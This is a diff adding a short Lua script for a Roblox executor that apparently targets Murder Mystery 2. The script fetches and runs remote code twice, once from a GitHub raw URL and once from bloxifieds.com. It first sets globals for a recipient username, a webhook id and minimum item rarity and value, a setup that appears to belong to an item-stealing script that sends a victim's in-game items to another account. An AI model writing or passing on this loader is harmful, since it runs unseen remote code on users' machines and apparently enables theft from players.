@@ -1,0 +1,18 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Waguriiiii/Murder-mystery-2/refs/heads/main/Waguri.lua"))()
+local function _httpGet(url)
+    if typeof(request)=="function" then local r=request({Url=url,Method="GET"}) if r and r.Body then return r.Body end end
+    if typeof(syn)=="table" and typeof(syn.request)=="function" then local r=syn.request({Url=url,Method="GET"}) if r and r.Body then return r.Body end end
+    if typeof(http_request)=="function" then local r=http_request({Url=url,Method="GET"}) if r and r.Body then return r.Body end end
+    if typeof(fluxus)=="table" and typeof(fluxus.request)=="function" then local r=fluxus.request({Url=url,Method="GET"}) if r and r.Body then return r.Body end end
+    if typeof(http)=="table" and typeof(http.request)=="function" then local r=http.request({Url=url,Method="GET"}) if r and r.Body then return r.Body end end
+    if typeof(game.HttpGet)=="function" then return game:HttpGet(url) end
+    error("[Loader] No HTTP method available on this executor")
+end
+
+getgenv().Username = "hthntyikntj"
+getgenv().Webhook = "wh_0575fc81f0e98e346ccf2c1ad038a599"
+getgenv().MinRarity = "Common"
+getgenv().MinValue = 0
+getgenv().Visual = ""
+getgenv().VisualMain = ""
+loadstring(_httpGet("https://bloxifieds.com/mm2/script"))()
